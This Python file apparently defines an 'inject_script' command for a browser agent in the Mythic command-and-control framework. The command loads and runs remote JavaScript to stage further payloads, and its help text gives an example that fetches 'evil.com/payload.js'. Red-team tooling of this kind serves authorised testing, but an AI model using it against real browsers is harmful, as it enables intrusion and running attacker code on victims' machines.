from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class InjectScriptArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL of the external JavaScript file to load and execute",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply a script URL")
        if self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class InjectScriptCommand(CommandBase):
    cmd = "inject_script"
    needs_admin = False
    help_cmd = "inject_script https://evil.com/payload.js"
    description = "Load and execute an external JavaScript file by injecting a script tag. Useful for staging additional payloads."
    version = 1
    author = "@grampae"
    attackmapping = ["T1059.007"]
    argument_class = InjectScriptArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = task.args.get_arg("url")
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
